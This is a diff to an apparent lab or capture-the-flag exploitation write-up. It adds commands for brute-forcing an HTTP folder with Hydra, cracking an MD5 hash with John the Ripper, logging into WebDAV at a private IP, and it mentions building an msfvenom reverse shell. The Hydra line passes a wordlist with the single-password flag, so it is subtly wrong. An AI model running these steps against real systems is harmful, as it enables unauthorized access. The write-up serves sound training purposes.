@@ -122,11 +122,11 @@ c) **Exploitation**
 
 - Hydra brute force action: `hydra -l ashton -p /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder/`
 
-- New username noted: ryan, need to crack its hash
+- On accessing the secret folder, a new username noted: ryan, need to crack its hash that is also provided in the secret folder
 
-- Crack hash with john the ripper
+- Crack hash with john the ripper: `john --format=raw-md5 stu_hash`
 
-- Now access Wdav with the username ryan and the cracked password
+- Now access Webdav with the username ryan and the cracked password : by typing `dav://192.168.1.105/webdav/` in browser
 
 - Msfvenom to create a reverse shell script
 
